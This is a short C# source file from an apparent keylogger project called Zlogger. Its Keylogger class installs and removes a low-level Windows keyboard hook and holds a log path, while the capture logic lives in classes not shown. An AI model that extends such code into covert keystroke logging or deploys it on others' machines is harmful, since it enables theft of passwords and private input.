using Rodjenihm.Zlogger.WinAPI;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Rodjenihm.Zlogger
{
    public sealed class Keylogger : IDisposable
    {
        private readonly LowLevelKeyboardHook hook;
        public string LogPath { get; set; }
        public HOOKPROC KeyboardHookProc { get; set; }

        public Keylogger()
        {
            hook = new LowLevelKeyboardHook();
        }

        public Keylogger(string logPath) : this()
        {
            LogPath = logPath;
        }

        public void Run()
        {
            hook.SetHook(KeyboardHookProc);
        }

        public void Dispose()
        {
            hook.RemoveHook();
        }
    }
}
